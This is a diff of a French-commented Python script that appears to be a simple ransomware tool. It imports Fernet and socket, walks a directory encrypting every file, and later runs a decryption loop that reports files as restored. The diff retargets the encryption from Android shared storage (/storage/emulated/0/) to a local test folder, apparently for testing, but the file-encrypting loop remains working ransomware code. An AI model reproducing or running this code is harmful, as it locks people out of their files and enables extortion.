@@ -1,5 +1,6 @@
 # coding: utf-8
 from ascii_magic import AsciiArt
+ 
 import socket, os
 from cryptography.fernet import Fernet
 os.system('clear')
@@ -13,7 +14,7 @@ ORANGE = "\033[38;5;208m"
 
 obj = "\t#########################################################################################"
 
-
+ 
 # Définition de la fonction de chiffrement
 def chiffrer(path):
     with open(path, "rb") as original_file:
@@ -51,7 +52,7 @@ except Exception as e:
 fn = Fernet(key)
 
 # Chiffrement des fichiers
-for path, dirs, files in os.walk("/storage/emulated/0/"):
+for path, dirs, files in os.walk("/home/iris/testR"):
     for f in files:
         chiffrer(os.path.join(path, f))
 
@@ -110,7 +111,7 @@ while True:
         texte ="\t\t\t\t\tDechiffrement des fichiers en cours..."
         print(BLUE + texte.format("bonjour") + RESET)
         print("\n"+obj+"\n")
-        for path, dirs, files in os.walk("/storage/emulated/0/ShadowWave/jael"):
+        for path, dirs, files in os.walk("/home/iris/testR"):
             for f in files:
                 dechiffrer(os.path.join(path, f))
                 message = f"\t{os.path.join(path, f)}{GREEN} restauré!{RESET}"
